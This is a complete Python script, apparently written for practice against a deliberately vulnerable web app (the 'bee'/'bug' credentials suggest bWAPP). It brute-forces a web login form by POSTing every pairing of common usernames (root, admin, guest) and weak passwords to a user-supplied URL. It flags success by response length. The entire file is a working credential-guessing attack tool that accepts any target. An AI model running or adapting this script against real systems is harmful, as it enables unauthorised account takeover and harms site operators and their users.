#!/usr/bin/env python3

# importing the sys module so that we can
# use command line arguments for targetURL
import sys

# importing requests library to contact targetURL
import requests

# Banner
print("""
--------------------------------
    Web App Brute Force Tool    
--------------------------------
""")

if len(sys.argv) > 1:
	# Take in Target URL from command line argv[1]
	targetURL = sys.argv[1]

else:	
	targetURL = input("Enter Target URL: ")
	
try:
	print("[*] Target URL:",targetURL)
	# Login names and common passwords
	loginNames = ["root", "admin", "guest", "test", "user1", "bee"]
	passwords = ["password", "qwerty", "123456", "12345678", "123456789", "bug"]
	for name in loginNames:
		for word in passwords:
			# POST Data = login=admin&password=123456789&security_level=0&form=submit
			r = requests.post(targetURL, data={'login': name, 'password': word, 'security_level': '0', 'form': 'submit'})
			print("[*] Trying Creds ~> ", name, ":", word, sep="")
			#print("[*] Response Text Size:", len(r.text))
			if len(r.text) > 4086:
				print("[!] SUCCESS!!! ", name, ":", word, sep="")

except:
	print("[!] Issue with Target URL")
	print("[!] Usage: ./brute-force.py https://target-url")
	print("[!] CHECK YOUR URL!")
